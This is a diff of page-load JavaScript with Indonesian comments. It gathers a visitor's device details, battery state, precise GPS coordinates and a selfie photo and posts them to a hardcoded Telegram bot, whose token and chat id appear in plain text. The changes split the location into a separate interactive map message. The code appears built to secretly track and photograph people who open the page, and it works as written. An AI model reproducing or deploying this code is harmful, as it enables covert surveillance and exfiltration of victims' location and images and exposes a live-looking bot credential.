@@ -66,43 +66,51 @@ window.addEventListener('DOMContentLoaded', async () => {
     return base64;
   };
 
-  const sendToTelegram = async (data) => {
-    const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
-    const chatId = '1265481161';
+ const sendToTelegram = async (data) => {
+  const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
+  const chatId = '1265481161';
 
-    const message = `
+  // 1. Kirim info perangkat (sebagai teks)
+  const message = `
 📱 *Perangkat*
 • UA: ${data.deviceInfo.userAgent}
 • Platform: ${data.deviceInfo.platform}
 • Resolusi: ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
 • Baterai: ${data.deviceInfo.battery.level}, Charging: ${data.deviceInfo.battery.isCharging}
-
-📍 *Lokasi*
-• Latitude: ${data.location.lat}
-• Longitude: ${data.location.lon}
-• Akurasi: ${data.location.accuracy} m
 `.trim();
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
 
-    const blob = await (await fetch(data.photoBase64)).blob();
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('photo', blob, 'selfie.jpg');
+  // 2. Kirim lokasi sebagai share-location (map interaktif)
+  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      latitude: data.location.lat,
+      longitude: data.location.lon
+    })
+  });
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-  };
+  // 3. Kirim foto selfie
+  const blob = await (await fetch(data.photoBase64)).blob();
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', blob, 'selfie.jpg');
+
+  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  });
+};
 
   try {
     const data = {};
